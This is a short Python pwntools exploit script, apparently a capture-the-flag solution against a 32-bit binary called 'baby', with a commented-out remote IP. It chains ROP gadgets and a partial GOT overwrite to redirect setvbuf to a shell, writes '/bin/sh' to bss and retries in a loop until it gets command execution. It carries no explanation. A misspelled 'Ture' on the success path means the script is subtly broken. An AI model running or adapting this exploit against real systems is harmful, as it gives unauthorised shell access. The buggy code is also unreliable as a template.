from pwn import*

#context.log_level='debug'
while(1):
	try:
		s=process(['baby'],env={"LD_PRELOAD":""})
		raw_input()
		#junk = "A"*0x30
		#s = remote('51.254.114.246',2222)
		bss = 0x804A040
		read = 0x8048330
		start = 0x8048370
		read_got = 0x804A00C
		pppr = 0x08048509
		setvbuf = 0x0804A014
		svb = 0x8048350
		after_setv = 0x08048493
		nj=p32(read)+p32(pppr)+p32(0)+p32(svb)+p32(3)+p32(after_setv)+"GGGGHHHHIIIIJJJJKKKK"
		junk = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
		#junk = p32(read+4)*(0x30/4)
		#raw_input()
		s.send(nj+'\x6c')#+p32(read)+p32(pppr)+p32(0)+p32(read_got)+p32(1))

		s.send('\xa0\x4d\x59')
                nj=p32(read)+p32(pppr)+p32(0)+p32(bss)+p32(8)+p32(after_setv)+"GGGGHHHHIIIIJJJJKKKK"	
		s.send(nj+'\x6c')
		s.send('/bin/sh')
		nj = p32(setvbuf) +'AAAA'+p32(bss) +p32(0)+p32(0)+p32(0)+"GGGGHHHHIIIIJJJJKKKK"
		s.send(nj+'\x6c')
		s.send('id')
#		sleep(0.3)
		text = s.recv(timeout=1.5)
		if "uid" in text:
			find = Ture
			break
	except:
		s.close()
		continue

	s.interactive()
